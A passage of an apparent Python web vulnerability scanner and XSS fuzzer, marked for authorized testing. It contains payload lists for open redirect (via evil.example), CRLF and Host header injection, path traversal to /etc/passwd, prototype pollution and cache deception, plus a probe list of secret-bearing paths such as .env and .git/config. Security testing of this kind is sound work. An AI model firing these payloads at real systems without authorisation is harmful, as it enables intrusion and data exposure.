            findings.append(Finding("cors", "medium",
                                    f"CORS: Origin reflection without credentials ({label})",
                                    "Reflected Origin — exploitable if app exposes sensitive data without auth.",
                                    evidence={"origin_sent": origin, "acao": acao}))
        if rate_limit_ok(args):
            time.sleep(args.rate_limit)
    return findings


def rate_limit_ok(args) -> bool:
    return getattr(args, "rate_limit", 0) > 0


REDIRECT_PARAMS = [
    "redirect", "redirect_uri", "redirectUrl", "redirectURL", "redir",
    "url", "next", "return", "returnTo", "returnUrl", "returnURL",
    "dest", "destination", "rurl", "callback", "go", "u", "to",
    "out", "link", "image_url", "checkout_url", "loginto", "logout",
    "continue", "forward", "uri", "target", "ref",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.example/",
    "//evil.example/",
    "/\\evil.example/",
    "/\\/evil.example/",
    "https:evil.example/",
    "https://evil.example#@target/",
    "https://target@evil.example/",
    "https://target.evil.example/",
    "////evil.example/",
    "%2f%2fevil.example/",
    "https://evil%2eexample/",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
]


def mod_open_redirect(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
    findings: list[Finding] = []
    parsed = urllib.parse.urlparse(base_req["url"])
    existing = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    target_host = parsed.netloc.lower()
    seen_params: set[str] = set()

    for param in REDIRECT_PARAMS:
        if param in seen_params:
            continue
        seen_params.add(param)
        for payload in OPEN_REDIRECT_PAYLOADS:
            new_params = [(k, v) for k, v in existing if k != param] + [(param, payload)]
            new_query = urllib.parse.urlencode(new_params, safe="")
            url = parsed._replace(query=new_query).geturl()
            resp = _safe_get(session, url, base_req["headers"], args.timeout)
            if rate_limit_ok(args):
                time.sleep(args.rate_limit)
            if resp is None:
                continue
            if resp.status_code not in (301, 302, 303, 307, 308):
                continue
            location = resp.headers.get("Location", "")
            if not location:
                continue
            loc_lower = location.lower()
            if "evil.example" in loc_lower or loc_lower.startswith("javascript:") or loc_lower.startswith("data:"):
                findings.append(Finding("open_redirect", "medium",
                                        f"Open redirect via ?{param}=",
                                        f"Status {resp.status_code} redirected to attacker-controlled destination.",
                                        evidence={"url": url, "payload": payload,
                                                  "status": resp.status_code, "location": location}))
                break
            try:
                parsed_loc = urllib.parse.urlparse(location)
                if parsed_loc.netloc and parsed_loc.netloc.lower() != target_host \
                        and "evil.example" not in parsed_loc.netloc.lower():
                    findings.append(Finding("open_redirect", "low",
                                            f"Possible open redirect via ?{param}= (off-host)",
                                            f"Redirect landed on different host: {parsed_loc.netloc}.",
                                            evidence={"url": url, "payload": payload,
                                                      "location": location}))
                    break
            except Exception:
                pass
    return findings


def mod_crlf_injection(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
    findings: list[Finding] = []
    INJECTED_HEADER = "X-CRLF-Test"
    INJECTED_VAL = "Zq8K3xRq"
    payloads = [
        f"%0d%0a{INJECTED_HEADER}:%20{INJECTED_VAL}",
        f"%0a{INJECTED_HEADER}:%20{INJECTED_VAL}",
        f"%E5%98%8A%E5%98%8D{INJECTED_HEADER}:%20{INJECTED_VAL}",  # UTF-8 overlong CR/LF
        f"%0d%0a%0d%0a{INJECTED_HEADER}:%20{INJECTED_VAL}",
        f"/%0d%0a{INJECTED_HEADER}:%20{INJECTED_VAL}",
    ]
    parsed = urllib.parse.urlparse(base_req["url"])
    existing = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)

    candidate_params = list(dict.fromkeys(
        [k for k, _ in existing] + COMMON_PARAM_NAMES[:12]
    ))

    for param in candidate_params:
        for p in payloads:
            new_query_parts = [f"{urllib.parse.quote(k)}={urllib.parse.quote(v)}"
                               for k, v in existing if k != param]
            new_query_parts.append(f"{urllib.parse.quote(param)}={p}")
            url = parsed._replace(query="&".join(new_query_parts)).geturl()
            resp = _safe_get(session, url, base_req["headers"], args.timeout)
            if rate_limit_ok(args):
                time.sleep(args.rate_limit)
            if resp is None:
                continue
            if INJECTED_HEADER.lower() in {k.lower() for k in resp.headers}:
                findings.append(Finding("crlf_injection", "high",
                                        f"CRLF injection via ?{param}=",
                                        "Injected header appears in response — full HTTP response-splitting vector.",
                                        evidence={"url": url, "payload": p,
                                                  "injected_header_seen": resp.headers.get(INJECTED_HEADER, "")}))
                break

    # Header-based CRLF (try Referer)
    for inject_header in ["Referer", "X-Forwarded-For", "X-Forwarded-Host"]:
        h = dict(base_req["headers"])
        h[inject_header] = f"a\r\n{INJECTED_HEADER}: {INJECTED_VAL}"
        resp = _safe_get(session, base_req["url"], h, args.timeout)
        if rate_limit_ok(args):
            time.sleep(args.rate_limit)
        if resp is None:
            continue
        if INJECTED_HEADER.lower() in {k.lower() for k in resp.headers}:
            findings.append(Finding("crlf_injection", "high",
                                    f"CRLF injection via {inject_header} header",
                                    "Injected header appears in response.",
                                    evidence={"injected_via": inject_header}))
    return findings


def mod_host_header_injection(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
    findings: list[Finding] = []
    EVIL = "evil.example"
    probes: list[tuple[str, str | None]] = [
        ("X-Forwarded-Host", EVIL),
        ("X-Forwarded-Server", EVIL),
        ("X-Host", EVIL),
        ("X-Original-Host", EVIL),
        ("Forwarded", f"host={EVIL}"),
        ("X-Forwarded-Proto", "http"),
    ]
    for header, value in probes:
        h = dict(base_req["headers"])
        h[header] = value
        resp = _safe_get(session, base_req["url"], h, args.timeout)
        if rate_limit_ok(args):
            time.sleep(args.rate_limit)
        if resp is None:
            continue
        location = resp.headers.get("Location", "")
        body_excerpt = (resp.text or "")[:8000]
        if value in location:
            findings.append(Finding("host_header_injection", "high",
                                    f"{header} reflected in Location",
                                    "Injected host appears in redirect Location — password-reset poisoning vector.",
                                    evidence={"header": header, "value": value, "location": location}))
        elif value in body_excerpt:
            findings.append(Finding("host_header_injection", "medium",
                                    f"{header} reflected in response body",
                                    "Injected host appears in body — possible cache poisoning vector.",
                                    evidence={"header": header, "value": value}))
    return findings


PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "/etc/passwd",
    "file:///etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
]
PATH_TRAVERSAL_SIGNATURES: list[tuple[str, str]] = [
    ("root:x:0:0:", "linux /etc/passwd"),
    ("daemon:x:", "linux /etc/passwd"),
    ("[fonts]", "windows win.ini"),
    ("for 16-bit app support", "windows win.ini"),
]
FILE_PARAMS = ["file", "path", "page", "view", "doc", "document", "src",
               "include", "template", "lang", "i", "load", "name"]


def mod_path_traversal(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
    findings: list[Finding] = []
    parsed = urllib.parse.urlparse(base_req["url"])
    existing = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    for param in FILE_PARAMS:
        for payload in PATH_TRAVERSAL_PAYLOADS:
            new_params = [(k, v) for k, v in existing if k != param] + [(param, payload)]
            new_query = urllib.parse.urlencode(new_params, safe="%/")
            url = parsed._replace(query=new_query).geturl()
            resp = _safe_get(session, url, base_req["headers"], args.timeout)
            if rate_limit_ok(args):
                time.sleep(args.rate_limit)
            if resp is None or not resp.text:
                continue
            for sig, name in PATH_TRAVERSAL_SIGNATURES:
                if sig in resp.text:
                    findings.append(Finding("path_traversal", "high",
                                            f"Path traversal via ?{param}= ({name})",
                                            "Response body contains file-content signature after sending traversal payload.",
                                            evidence={"url": url, "payload": payload,
                                                      "signature": sig}))
                    return findings  # one is enough — stop hammering
    return findings


def mod_http_methods(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
    findings: list[Finding] = []
    resp = _safe_get(session, base_req["url"], base_req["headers"], args.timeout, method="OPTIONS")
    if resp is None:
        return []
    allow = resp.headers.get("Allow") or resp.headers.get("Access-Control-Allow-Methods", "")
    if allow:
        findings.append(Finding("http_methods", "info",
                                f"OPTIONS Allow: {allow}",
                                "Methods declared by OPTIONS response.",
                                evidence={"allow": allow}))
        allow_upper = allow.upper()
        if "TRACE" in allow_upper:
            findings.append(Finding("http_methods", "medium",
                                    "TRACE method enabled",
                                    "Cross-Site Tracing (XST) possible — TRACE echoes request including cookies.",
                                    evidence={"allow": allow}))
        for risky in ["PUT", "DELETE", "PATCH"]:
            if risky in allow_upper:
                findings.append(Finding("http_methods", "low",
                                        f"{risky} method advertised",
                                        f"OPTIONS declares {risky} is allowed — investigate auth/authorization.",
                                        evidence={"allow": allow}))
    # Quick TRACE probe even without OPTIONS hint
    trace = _safe_get(session, base_req["url"], base_req["headers"], args.timeout, method="TRACE")
    if rate_limit_ok(args):
        time.sleep(args.rate_limit)
    if trace is not None and trace.status_code < 400 and "TRACE" in (trace.text or "").upper()[:200]:
        findings.append(Finding("http_methods", "medium",
                                "TRACE returned 2xx with echoed request",
                                "Confirmed TRACE enabled — XST risk.",
                                evidence={"status": trace.status_code}))
    return findings


def mod_prototype_pollution(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
    findings: list[Finding] = []
    marker = "ZpolutedZ"
    payloads = [
        f"__proto__[xsstest]={marker}",
        f"__proto__.xsstest={marker}",
        f"constructor[prototype][xsstest]={marker}",
        f"constructor.prototype.xsstest={marker}",
    ]
    parsed = urllib.parse.urlparse(base_req["url"])
    for p in payloads:
        new_query = (parsed.query + "&" + p) if parsed.query else p
        url = parsed._replace(query=new_query).geturl()
        resp = _safe_get(session, url, base_req["headers"], args.timeout)
        if rate_limit_ok(args):
            time.sleep(args.rate_limit)
        if resp is None:
            continue
        if marker in (resp.text or ""):
            findings.append(Finding("prototype_pollution", "medium",
                                    f"Marker reflected after pollution-style param: {p[:60]}",
                                    "Server returned the polluted value — check if app merges query params into objects unsafely.",
                                    evidence={"url": url}))
    return findings


SENSITIVE_PATHS: list[tuple[str, str]] = [
    ("/robots.txt", "info"),
    ("/sitemap.xml", "info"),
    ("/.well-known/security.txt", "info"),
    ("/.git/HEAD", "high"),
    ("/.git/config", "high"),
    ("/.env", "high"),
    ("/.env.local", "high"),
    ("/.htaccess", "medium"),
    ("/web.config", "medium"),
    ("/server-status", "high"),
    ("/server-info", "high"),
    ("/phpinfo.php", "high"),
    ("/info.php", "high"),
    ("/swagger.json", "medium"),
    ("/swagger-ui.html", "medium"),
    ("/api-docs", "medium"),
    ("/openapi.json", "medium"),
    ("/v2/api-docs", "medium"),
    ("/actuator", "high"),
    ("/actuator/health", "medium"),
    ("/actuator/env", "high"),
    ("/actuator/heapdump", "high"),
    ("/admin", "low"),
    ("/admin/", "low"),
    ("/console", "medium"),
    ("/wp-admin", "low"),
    ("/wp-login.php", "low"),
    ("/login", "info"),
    ("/graphql", "medium"),
    ("/.DS_Store", "low"),
    ("/backup.zip", "high"),
    ("/dump.sql", "high"),
    ("/crossdomain.xml", "info"),
    ("/clientaccesspolicy.xml", "info"),
]


def mod_sensitive_paths(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
    findings: list[Finding] = []
    parsed = urllib.parse.urlparse(base_req["url"])
    root = f"{parsed.scheme}://{parsed.netloc}"
    for path, sev in SENSITIVE_PATHS:
        url = root + path
        resp = _safe_get(session, url, base_req["headers"], args.timeout)
        if rate_limit_ok(args):
            time.sleep(args.rate_limit)
        if resp is None:
            continue
        if resp.status_code in (200, 201, 401, 403):
            ctype = resp.headers.get("Content-Type", "")
            body_excerpt = (resp.text or "")[:500]
            # 401/403 still useful — confirms endpoint exists
            level = "info" if resp.status_code in (401, 403) else sev
            findings.append(Finding("sensitive_paths", level,
                                    f"{path} → HTTP {resp.status_code}",
                                    f"Path exists (status {resp.status_code}). Check if content leaks data.",
                                    evidence={"url": url, "status": resp.status_code,
                                              "content_type": ctype, "body_excerpt": body_excerpt}))
    return findings


def mod_https_downgrade(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
    parsed = urllib.parse.urlparse(base_req["url"])
    if parsed.scheme != "https":
        return []
    http_url = parsed._replace(scheme="http").geturl()
    resp = _safe_get(session, http_url, base_req["headers"], args.timeout)
    if rate_limit_ok(args):
        time.sleep(args.rate_limit)
    if resp is None:
        return []
    findings: list[Finding] = []
    location = resp.headers.get("Location", "")
    if resp.status_code < 400 and not location:
        findings.append(Finding("https_downgrade", "high",
                                "Plain HTTP returns 2xx without redirect",
                                "HTTPS endpoint serves the same content over HTTP — MITM exposure.",
                                evidence={"http_url": http_url, "status": resp.status_code}))
    elif resp.status_code in (301, 302, 307, 308) and location:
        if location.lower().startswith("http://"):
            findings.append(Finding("https_downgrade", "high",
                                    "HTTP redirects to another HTTP URL",
                                    "Plain HTTP redirect chain stays on HTTP — no HTTPS upgrade.",
                                    evidence={"location": location}))
    return findings


def mod_cache_deception(session: requests.Session, base_req: dict[str, Any], args) -> list[Finding]:
    findings: list[Finding] = []
    parsed = urllib.parse.urlparse(base_req["url"])
    for suffix in [".css", ".js", ".jpg", ".png", "/styles.css", "/script.js"]:
        new_path = parsed.path.rstrip("/") + suffix
        url = parsed._replace(path=new_path).geturl()
        resp = _safe_get(session, url, base_req["headers"], args.timeout)
        if rate_limit_ok(args):
            time.sleep(args.rate_limit)
        if resp is None:
            continue
        ctype = resp.headers.get("Content-Type", "").lower()
        cache_control = resp.headers.get("Cache-Control", "").lower()
        # Cache-deception only matters if content is dynamic/HTML but cacheable
        if resp.status_code == 200 and "text/html" in ctype and (
                "public" in cache_control or "max-age" in cache_control or not cache_control
        ):
            findings.append(Finding("cache_deception", "medium",
                                    f"Cache deception: {suffix} suffix served HTML",
                                    "Dynamic HTML served under static-looking URL; CDN may cache the user's authenticated page.",
                                    evidence={"url": url, "content_type": ctype,
                                              "cache_control": cache_control}))
    return findings


VULN_MODULES: list[tuple[str, Callable, str]] = [
    ("security_headers", mod_security_headers, "passive: missing CSP/XFO/HSTS/XCTO/Referrer/Permissions"),
    ("cookie_security", mod_cookie_security, "passive: cookie HttpOnly/Secure/SameSite flags"),
    ("server_info", mod_server_info, "passive: Server/X-Powered-By fingerprints"),
    ("cors", mod_cors, "active: Origin reflection + credentials"),
    ("open_redirect", mod_open_redirect, "active: classic open-redirect bypasses on redirect-shaped params"),
    ("crlf_injection", mod_crlf_injection, "active: CRLF (response splitting) in params + headers"),
    ("host_header_injection", mod_host_header_injection, "active: Host / X-Forwarded-Host poisoning"),
    ("path_traversal", mod_path_traversal, "active: traversal payloads in file/path-shaped params"),
    ("http_methods", mod_http_methods, "semi-active: OPTIONS Allow header, TRACE probe"),
    ("prototype_pollution", mod_prototype_pollution, "active: __proto__ query params"),
    ("sensitive_paths", mod_sensitive_paths, "active: probe ~30 sensitive paths (.git/.env/swagger/actuator/etc.)"),
    ("https_downgrade", mod_https_downgrade, "active: does http:// serve the same content"),
    ("cache_deception", mod_cache_deception, "active: .css/.js suffix path-confusion"),
]


def run_vuln_modules(session: requests.Session, base_req: dict[str, Any], args,
                     selected: list[str] | None, progress: bool = True) -> list[Finding]:
    findings: list[Finding] = []
    for name, fn, desc in VULN_MODULES:
        if selected and name not in selected:
            continue
        if progress:
            print(f"[mod] {name:25s} — {desc}", file=sys.stderr)
        if getattr(args, "dry_run", False):
            if progress:
                print("      (dry-run) skipped", file=sys.stderr)
            continue
        try:
            mod_findings = fn(session, base_req, args)
            findings.extend(mod_findings)
            if progress and mod_findings:
                for f in mod_findings:
                    print(f"      [{f.severity:6s}] {f.title}", file=sys.stderr)
        except Exception as e:
            print(f"      [error] {name} raised: {e}", file=sys.stderr)
    return findings


# ----------------------------------------------------------------------------
# Test executor
# ----------------------------------------------------------------------------

@dataclass
class TestCase:
    name: str
    category: str
    payload: str
    accept: str


def build_test_cases(
    categories: list[str] | None = None,
    accept_variants: list[str] | None = None,
) -> list[TestCase]:
    cases: list[TestCase] = []
    cats = categories if categories else list(PAYLOADS.keys())
    accepts = accept_variants if accept_variants is not None else ACCEPT_VARIANTS
    for cat in cats:
        if cat not in PAYLOADS:
            print(f"Unknown category: {cat} (skipped)", file=sys.stderr)
            continue
        for i, payload in enumerate(PAYLOADS[cat]):
            for accept in accepts:
                cases.append(TestCase(
                    name=f"{cat}#{i}|accept:{accept[:30]}",
                    category=cat,
                    payload=payload,
                    accept=accept,
                ))
    return cases


def make_session(verify_tls: bool = True) -> requests.Session:
    s = requests.Session()
    retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[502, 503, 504])
    s.mount("http://", HTTPAdapter(max_retries=retry))
    s.mount("https://", HTTPAdapter(max_retries=retry))
    s.verify = verify_tls
    return s


def execute_one(
    session: requests.Session,
    base_req: dict[str, Any],
    case: TestCase,
    timeout: int,
    dry_run: bool,
) -> dict[str, Any]:
    req = apply_payload(base_req, case.payload)
    req["headers"]["Accept"] = case.accept

    record: dict[str, Any] = {
        "case": case.name,
        "category": case.category,
        "payload": case.payload,
        "accept": case.accept,
        "method": req["method"],
        "url": req["url"],
        "sent_headers": req["headers"],
        "sent_body": req["body"],
    }

    if dry_run:
        record["dry_run"] = True
        return record

    try:
        resp = session.request(
            method=req["method"],
            url=req["url"],
            headers=req["headers"],
            data=req["body"].encode("utf-8", errors="replace") if req["body"] else None,
            timeout=timeout,
            allow_redirects=False,
        )
        record["analysis"] = analyze_response(resp, case.payload)
    except requests.RequestException as e:
        record["error"] = str(e)

    return record


def run(
    base_req: dict[str, Any],
    cases: list[TestCase],
    workers: int,
    rate_limit: float,
    timeout: int,
    verify_tls: bool,
    dry_run: bool,
    progress: bool = True,
) -> list[dict[str, Any]]:
    session = make_session(verify_tls=verify_tls)
    results: list[dict[str, Any]] = []
    total = len(cases)

    if workers <= 1:
        for i, case in enumerate(cases, 1):
            r = execute_one(session, base_req, case, timeout, dry_run)
            results.append(r)
            if progress:
                print(f"[{i}/{total}] {case.name}", file=sys.stderr)
            if rate_limit > 0 and not dry_run:
                time.sleep(rate_limit)
    else:
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futures = {
                pool.submit(execute_one, session, base_req, case, timeout, dry_run): case
                for case in cases
            }
            for i, fut in enumerate(as_completed(futures), 1):
                r = fut.result()
                results.append(r)
                if progress:
                    print(f"[{i}/{total}] {futures[fut].name}", file=sys.stderr)
                if rate_limit > 0 and not dry_run:
                    time.sleep(rate_limit / workers)

    return results


# ----------------------------------------------------------------------------
# Reporting
# ----------------------------------------------------------------------------

def summarize(results: list[dict[str, Any]]) -> dict[str, Any]:
    scored = [r for r in results if "analysis" in r]
    interesting = [r for r in scored if r["analysis"]["score"] >= 50]
    interesting.sort(key=lambda r: r["analysis"]["score"], reverse=True)

    by_category: dict[str, int] = {}
    for r in interesting:
        by_category[r["category"]] = by_category.get(r["category"], 0) + 1

    any_reflection = [r for r in scored if r["analysis"]["reflections"]]
    html_responses = [r for r in scored if r["analysis"]["is_html"]]

    return {
        "total_requests": len(results),
        "errored": sum(1 for r in results if "error" in r),
        "any_reflection_count": len(any_reflection),
        "html_response_count": len(html_responses),
        "interesting_count": len(interesting),
        "by_category": by_category,
        "top_findings": interesting[:20],
    }


def print_summary(summary: dict[str, Any]) -> None:
    line = "=" * 64
    print(f"\n{line}")
    print("XSS Bypass Test Summary")
    print(line)
    print(f"Total requests sent  : {summary['total_requests']}")
    print(f"Errored              : {summary['errored']}")
    print(f"Any reflection       : {summary['any_reflection_count']}")
    print(f"HTML responses       : {summary['html_response_count']}")
    print(f"Interesting (>=50)   : {summary['interesting_count']}")

    if summary["by_category"]:
        print("\nInteresting by category:")
        for cat, n in sorted(summary["by_category"].items(), key=lambda x: -x[1]):
            print(f"  {cat:30s} {n}")

    if summary["top_findings"]:
        print("\nTop findings:")
        for i, r in enumerate(summary["top_findings"], 1):
            a = r["analysis"]
            print(f"\n  [{i}] score={a['score']} category={r['category']}")
            print(f"      payload : {r['payload'][:100]!r}")
            print(f"      accept  : {r['accept'][:60]}")
            print(f"      status  : {a['status']}")
            print(f"      ctype   : {a['content_type']}")
            print(f"      context : {a['context']}")
            print(f"      refl    : {a['reflections']}")
            print(f"      csp     : {a['has_csp']}  nosniff: {a['has_nosniff']}")
            if a.get("surrounding"):
                print(f"      around  : {a['surrounding'][0][:160]!r}")
    else:
        print("\nNo high-score findings. Inspect the raw report for partial reflections,")
        print("error-code variations, and security-header gaps.")
    print(line + "\n")


# ----------------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------------

def build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="XSS reflection and bypass tester (authorized internal testing only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Mark each value you want fuzzed with the literal token §INJECT§\n"
            "(section sign + INJECT + section sign) in URL, header values, or body."
        ),
    )

    g_req = p.add_argument_group("request source (pick one)")
    g_req.add_argument("--raw", type=Path, help="Path to a raw HTTP request file (Burp Repeater style).")
    g_req.add_argument("-u", "--url", help="Target URL.")

    g_inline = p.add_argument_group("inline request (used with -u)")
    g_inline.add_argument("-X", "--method", default="GET", help="HTTP method (default GET).")
    g_inline.add_argument("-H", "--header", action="append", default=[],
                          help="Header 'Name: value'. Repeat for multiple. Use the marker in any value.")
    g_inline.add_argument("-b", "--body", default="", help="Request body. May contain the marker.")
    g_inline.add_argument("--cookie", default=None,
                          help="Auth cookie(s) to attach in auto mode, e.g. 'sess=abc; auth=xyz'. "
                               "Each named value is also added as an injection vector.")

    g_auto = p.add_argument_group("auto mode")
    g_auto.add_argument("--auto", action="store_true",
                        help="Force auto-discovery even if a marker is present. "
                             "Auto-discovery probes common params/headers/cookies/path for reflection, "
                             "then fuzzes only the reflecting ones. Enabled automatically when no marker is found.")
    g_auto.add_argument("--max-vectors", type=int, default=5,
                        help="Cap on how many reflecting injection points to fuzz (default 5).")
    g_auto.add_argument("--probe-only", action="store_true",
                        help="Auto mode: stop after reflection-probe + DOM scan; do not run the payload battery.")
    g_auto.add_argument("--auto-accept-only", action="store_true",
                        help="In auto mode, use the 3-Accept trimmed variant list (faster, default). "
                             "Pass --full-accept to use all 6.")
    g_auto.add_argument("--full-accept", action="store_true",
                        help="Use all 6 Accept-header variants per payload, even in auto mode.")

    g_vuln = p.add_argument_group("vulnerability modules (auto-run alongside XSS)")
    g_vuln.add_argument("--modules", nargs="+",
                        help=f"Restrict to specific modules. Available: {', '.join(m[0] for m in VULN_MODULES)}. "
                             "Default: all run.")
    g_vuln.add_argument("--skip-modules", nargs="+",
                        help="Exclude specific modules.")
    g_vuln.add_argument("--no-vuln-modules", action="store_true",
                        help="Skip all vulnerability modules; only run XSS.")
    g_vuln.add_argument("--no-xss", action="store_true",
                        help="Skip the XSS battery; only run vulnerability modules.")
    g_vuln.add_argument("--list-modules", action="store_true",
                        help="List vulnerability modules and exit.")

    g_raw = p.add_argument_group("raw request options")
    g_raw.add_argument("--scheme", default="https", choices=["http", "https"],
                       help="Scheme for raw requests (default https).")
    g_raw.add_argument("--host", help="Override the Host header from a raw request.")

    g_exec = p.add_argument_group("execution")
    g_exec.add_argument("--workers", type=int, default=DEFAULT_WORKERS,
                        help=f"Concurrent workers (default {DEFAULT_WORKERS}).")
    g_exec.add_argument("--rate-limit", type=float, default=DEFAULT_RATE_LIMIT,
                        help=f"Seconds between requests (default {DEFAULT_RATE_LIMIT}).")
    g_exec.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT,
                        help=f"Per-request timeout (default {DEFAULT_TIMEOUT}s).")
    g_exec.add_argument("--no-verify", action="store_true", help="Skip TLS verification.")
    g_exec.add_argument("--dry-run", action="store_true", help="Print what would be sent, fire nothing.")
    g_exec.add_argument("--categories", nargs="+",
                        help=f"Restrict to payload categories. Available: {', '.join(PAYLOADS.keys())}")
    g_exec.add_argument("--list-categories", action="store_true",
                        help="List payload categories and counts, then exit.")

    g_out = p.add_argument_group("output")
    g_out.add_argument("--output", type=Path, help="Write full JSON report to this path.")
    g_out.add_argument("--quiet", action="store_true", help="Suppress per-request progress.")

    return p


def main(argv: list[str] | None = None) -> int:
    args = build_arg_parser().parse_args(argv)

    if args.list_categories:
        print("Payload categories:")
        for cat, payloads in PAYLOADS.items():
            print(f"  {cat:30s} {len(payloads)} payloads")
        print(f"\nAccept-header variants per payload: {len(ACCEPT_VARIANTS)}")
        total = sum(len(p) for p in PAYLOADS.values()) * len(ACCEPT_VARIANTS)
        print(f"Total test cases if all categories selected: {total}")
        return 0

    if args.list_modules:
        print("Vulnerability modules:")
        for name, _fn, desc in VULN_MODULES:
            print(f"  {name:25s} {desc}")
        return 0

    if args.raw:
        raw = args.raw.read_text(encoding="utf-8", errors="replace")
        base_req = parse_raw_request(raw, scheme=args.scheme, host_override=args.host)
    elif args.url:
        headers: dict[str, str] = {}
        for h in args.header:
            if ":" not in h:
                print(f"Bad header (missing colon): {h}", file=sys.stderr)
                return 2
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
        base_req = {
            "method": args.method.upper(),
            "url": args.url,
            "headers": headers,
            "body": args.body,
        }
    else:
        print("Provide --raw or -u/--url. See --help.", file=sys.stderr)
        return 2

    points = find_injection_points(base_req)
    auto_mode = args.auto or not points
    # Auto mode trims the Accept fan-out by default (more vectors → more requests).
    # Manual mode uses the full set unless the user explicitly trimmed.
    if args.full_accept:
        accept_variants = ACCEPT_VARIANTS
    elif auto_mode:
        accept_variants = AUTO_ACCEPT_VARIANTS
    else:
        accept_variants = ACCEPT_VARIANTS

    session = make_session(verify_tls=not args.no_verify)

    dom_report: dict[str, Any] | None = None
    discovery: list[dict[str, Any]] = []
    all_results: list[dict[str, Any]] = []
    vuln_findings: list[Finding] = []

    # Run vulnerability modules in auto mode (or whenever no marker given).
    # These don't depend on the XSS battery so we run them regardless.
    if not args.no_vuln_modules and (auto_mode or args.modules):
        selected = args.modules
        if args.skip_modules:
            base = selected if selected else [m[0] for m in VULN_MODULES]
            selected = [m for m in base if m not in args.skip_modules]
        print("=" * 64, file=sys.stderr)
        print("Vulnerability modules", file=sys.stderr)
        print("=" * 64, file=sys.stderr)
        try:
            vuln_findings = run_vuln_modules(session, base_req, args,
                                             selected=selected, progress=not args.quiet)
        except Exception as e:
            print(f"[vuln runner error] {e}", file=sys.stderr)

    if args.no_xss:
        print("--no-xss set; skipping XSS battery.", file=sys.stderr)
    elif auto_mode:
        print("=" * 64, file=sys.stderr)
        print("XSS auto mode — no marker provided (or --auto forced).", file=sys.stderr)
        print("=" * 64, file=sys.stderr)

        try:
            # Stage 1: static DOM-sink scan on baseline GET
            print("[1/3] Static DOM-sink scan...", file=sys.stderr)
            dom_report = static_dom_scan(session, base_req["url"], args.timeout)
            if dom_report.get("error"):
                print(f"     baseline fetch error: {dom_report['error']}", file=sys.stderr)
            else:
                print(f"     status={dom_report['status']}  ctype={dom_report['content_type']}  body={dom_report['body_length']} bytes",
                      file=sys.stderr)
                print(f"     sinks   : {dom_report['sinks_found'] or '(none)'}", file=sys.stderr)
                print(f"     sources : {dom_report['sources_found'] or '(none)'}", file=sys.stderr)
                if dom_report["potential_dom_xss"]:
                    print("     [!] Potential DOM XSS — sinks AND sources both present. Inspect JS sources.",
                          file=sys.stderr)

            # Stage 2: expand candidate injection points and probe for reflection
            vectors = auto_expand(base_req, args.cookie)
            print(f"\n[2/3] Probing {len(vectors)} candidate injection points for reflection...",
                  file=sys.stderr)
            if args.dry_run:
                print("(dry-run) Skipping probe.", file=sys.stderr)
                discovery = []
            else:
                discovery = discover_reflecting_vectors(
                    session=session,
                    vectors=vectors,
                    timeout=args.timeout,
                    rate_limit=args.rate_limit,
                    max_vectors=args.max_vectors,
                    progress=not args.quiet,
                )
                print(f"\n     {len(discovery)} reflecting vector(s) selected for fuzzing (cap={args.max_vectors}).",
                      file=sys.stderr)
        except FatalProbeError as e:
            print(f"\n[FATAL] {e}", file=sys.stderr)
            return 3

        if args.probe_only:
            print("\n--probe-only set; stopping after discovery.", file=sys.stderr)
        else:
            # Stage 3: fuzz each reflecting vector with the full payload battery
            if not discovery:
                print("\n[3/3] No reflecting vectors found.", file=sys.stderr)
                print("       Try --cookie '<auth>' if the page requires login,", file=sys.stderr)
                print("       or supply a raw request with --raw and mark §INJECT§ manually.", file=sys.stderr)
            else:
                cases = build_test_cases(args.categories, accept_variants=accept_variants)
                print(f"\n[3/3] Fuzzing {len(discovery)} vector(s) with {len(cases)} test cases each "
                      f"({len(cases) * len(discovery)} requests total).", file=sys.stderr)
                for v_idx, ref in enumerate(discovery, 1):
                    label = ref["label"]
                    print(f"\n  >>> Vector {v_idx}/{len(discovery)}: {label}", file=sys.stderr)
                    results = run(
                        base_req=ref["req"],
                        cases=cases,
                        workers=args.workers,
                        rate_limit=args.rate_limit,
                        timeout=args.timeout,
                        verify_tls=not args.no_verify,
                        dry_run=args.dry_run,
                        progress=not args.quiet,
                    )
                    for r in results:
                        r["injection_point"] = label
                    all_results.extend(results)
    else:
        # Manual mode — marker present, single injection point
        print(f"Injection points: {[p[0] for p in points]}", file=sys.stderr)
        cases = build_test_cases(args.categories, accept_variants=accept_variants)
        print(f"Test cases: {len(cases)}", file=sys.stderr)
        if args.dry_run:
            print("Dry-run mode — no requests will be sent.", file=sys.stderr)
        all_results = run(
            base_req=base_req,
            cases=cases,
            workers=args.workers,
            rate_limit=args.rate_limit,
            timeout=args.timeout,
            verify_tls=not args.no_verify,
            dry_run=args.dry_run,
            progress=not args.quiet,
        )

    summary: dict[str, Any] | None = None
    if not args.dry_run and all_results:
        summary = summarize(all_results)
        print_summary(summary)

    # Vulnerability-finding summary
    if vuln_findings:
        print_vuln_findings(vuln_findings)

    if args.output:
        out: dict[str, Any] = {
            "base_request": {
                "method": base_req["method"],
                "url": base_req["url"],
                "headers": base_req["headers"],
                "body": base_req["body"],
            },
